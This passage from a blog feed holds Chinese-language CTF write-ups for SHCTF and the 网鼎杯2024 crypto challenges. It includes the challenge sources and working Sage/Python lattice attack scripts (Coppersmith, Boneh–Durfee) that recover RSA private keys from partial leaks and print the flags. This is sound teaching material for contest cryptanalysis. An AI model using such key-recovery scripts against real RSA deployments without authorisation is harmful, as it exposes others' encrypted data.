class="line">leakl = <span class="number">175</span></span><br><span class="line">dbits = <span class="number">512</span></span><br><span class="line">dh = dm * <span class="number">2</span>^(dbits-leakh)</span><br><span class="line"></span><br><span class="line">k_ = e*dh // n</span><br><span class="line"></span><br><span class="line">PR.&lt;x,y&gt; = PolynomialRing(Zmod(e*<span class="number">2</span>^leakl))</span><br><span class="line">f = <span class="number">1</span> + (k_ + x) * ((n+<span class="number">1</span>) - y) - e*dl</span><br><span class="line"></span><br><span class="line">bounds = (<span class="number">2</span>^(dbits - leakh),<span class="number">2</span>^<span class="number">513</span>)</span><br><span class="line">res = small_roots(f,bounds,m=<span class="number">4</span>,d=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pplusq = <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">pminusq = iroot(pplusq^<span class="number">2</span>-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p = (pplusq + pminusq) // <span class="number">2</span></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))).decode())</span><br><span class="line"><span class="comment"># SHCTF&#123;If_people_do_not_believe_that_mathematics_is_simple,it_is_only_because_they_do_not_realize_how_complicated_life_is.&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/ekss3fOeQhhfVNMIvqrP1Q">官方wp</a></p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>格密码，好玩！</p><p>顺便摘抄一句</p><blockquote><p>在构建完格之后，我们需要判断Hermite定理是否成立。Hermite定理为我们提供了一个判断格基是否规约的标准。如果定理不成立，我们就需要调整参数，直到找到一个满足Hermite定理的格基。这一过程可能需要多次迭代和调整，但它确保了我们最终得到的格基是规约的，从而提高了找到最短向量或近似最短向量的准确性。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://ctf.qlu.edu.cn&quot;&gt;https://ctf.qlu.edu.cn&lt;/a&gt;&lt;br /&gt;
平台不知道什么时候关闭&lt;/p&gt;
&lt;p&gt;尼玛，新生赛一堆，&lt;code&gt;newstar 0xgame&lt;/code&gt;都只是打了一下就不想打了，忙不过</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>网鼎杯2024青龙组&amp;&amp;强网杯2024-WriteUp</title>
    <link href="https://hvang10.github.io/2024/11/04/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84&amp;&amp;%E5%BC%BA%E7%BD%91%E6%9D%AF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/11/04/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84&amp;&amp;%E5%BC%BA%E7%BD%91%E6%9D%AF2024-WriteUp/</id>
    <published>2024-11-04T14:44:50.000Z</published>
    <updated>2024-11-10T15:41:40.177Z</updated>
    
    <content type="html"><![CDATA[<p>写在最前面，原题杯与<code>咸鱼CTF</code></p><h1 id="网鼎杯2024青龙组"><a class="markdownIt-Anchor" href="#网鼎杯2024青龙组"></a> 网鼎杯2024青龙组</h1><h2 id="crypto001"><a class="markdownIt-Anchor" href="#crypto001"></a> CRYPTO001</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = getPrime(<span class="number">299</span>)</span><br><span class="line">e = inverse(d,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint1 = p &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line">hint2 = q &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint1 = <span class="subst">&#123;hint1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint2 = <span class="subst">&#123;hint2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">123789043095302886784777548580725867919630872720308267296330863659260260632444171595208750648710642616709290340791408935502415290984231140635423328808872594955139658822363033096014857287439409252367248420356169878044065798634016290690979979625051287064109800759113475629317869327100941592970373827299442569489</span></span><br><span class="line">e = <span class="number">112070481298571389221611833986644006256566240788306316765530852688390558290807060037831460397016038678699757261874520899143918664293504728402666398893964929840011110057060969775245481057773655679041350091817099143204028098431544760662690479779286160425059494739419234859710815966582837874194763305328789592245</span></span><br><span class="line">c = <span class="number">63662561509209168743977531923281040338804656992093161358503738280395090747786427812762995865224617853709000826994250614233562094619845247321880231488631212423212167167713869682181551433686816142488666533035193128298379649809096863305651271646535125466745409868274019550361728139482502448613835444108383177119</span></span><br><span class="line">hint1 = <span class="number">897446442156802074692</span></span><br><span class="line">hint2 = <span class="number">1069442646630079275131</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">hint1 = p &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line">hint2 = q &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br></pre></td></tr></table></figure><p>可以看到是<code>pq</code>的高位泄露，感觉可以打二元<code>copper</code>(?，但不太了解，找了一下没找到相关比较契合的打高位泄露的文章</p><p>然后就在大佬的博客里面找高位泄露的脚本，终于在糖醋小鸡块师傅的博客里找到了一篇类似的例题</p><p>参考糖醋小鸡块师傅<a href="https://tangcuxiaojikuai.xyz/post/a6ee3e0e.html">https://tangcuxiaojikuai.xyz/post/a6ee3e0e.html</a>的<code>Insights</code></p><p>参考的这题<code>pq</code>的高位都是一样的，对于现在这道题，我们只需要把这里改掉就好了<br />脚本如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nbit = <span class="number">1024</span></span><br><span class="line">n = <span class="number">123789043095302886784777548580725867919630872720308267296330863659260260632444171595208750648710642616709290340791408935502415290984231140635423328808872594955139658822363033096014857287439409252367248420356169878044065798634016290690979979625051287064109800759113475629317869327100941592970373827299442569489</span></span><br><span class="line">e = <span class="number">112070481298571389221611833986644006256566240788306316765530852688390558290807060037831460397016038678699757261874520899143918664293504728402666398893964929840011110057060969775245481057773655679041350091817099143204028098431544760662690479779286160425059494739419234859710815966582837874194763305328789592245</span></span><br><span class="line">c = <span class="number">63662561509209168743977531923281040338804656992093161358503738280395090747786427812762995865224617853709000826994250614233562094619845247321880231488631212423212167167713869682181551433686816142488666533035193128298379649809096863305651271646535125466745409868274019550361728139482502448613835444108383177119</span></span><br><span class="line">hint1 = <span class="number">897446442156802074692</span></span><br><span class="line">hint2 = <span class="number">1069442646630079275131</span></span><br><span class="line">ph = <span class="built_in">int</span>(hint1&lt;&lt;<span class="number">442</span>)</span><br><span class="line">qh = <span class="built_in">int</span>(hint2&lt;&lt;<span class="number">442</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#part1 boneh and durfee to get d</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">    m = <span class="number">8</span></span><br><span class="line">    delta = <span class="number">0.30</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(n^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = <span class="number">2</span>^<span class="number">442</span>   <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    A = (n+<span class="number">1</span>)//<span class="number">2</span> - (ph+qh)//<span class="number">2</span></span><br><span class="line">    PR.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    pol = <span class="number">1</span>+x*(A+y)</span><br><span class="line"><span class="comment">#     res = boneh_durfee(pol, e, m, t, X, Y)</span></span><br><span class="line"><span class="comment">#     print(res)</span></span><br><span class="line"></span><br><span class="line">k2,pl_ql = <span class="number">1476216873354030897123807900312494643299166545025397520836636477078919248983223765331825148</span>, -<span class="number">5248359230286975998007421528138879480670687275342665043065128666287838030017492213260091350908248072270884523636416440683845503716271</span></span><br><span class="line">d = (<span class="number">1</span>+k2*(A+pl_ql)) // e</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;wdflag&#123;f2cd2e39-7009-4f8f-89f3-285d50c6ca0f&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto002"><a class="markdownIt-Anchor" href="#crypto002"></a> CRYPTO002</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"><span class="comment">#flag = &#x27;wdflag&#123;123&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">victory_encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    key = key.upper()</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    plaintext = plaintext.upper()</span><br><span class="line">    ciphertext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext):</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift = <span class="built_in">ord</span>(key[i % key_length]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            encrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            ciphertext += encrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ciphertext += char</span><br><span class="line"></span><br><span class="line">    <span 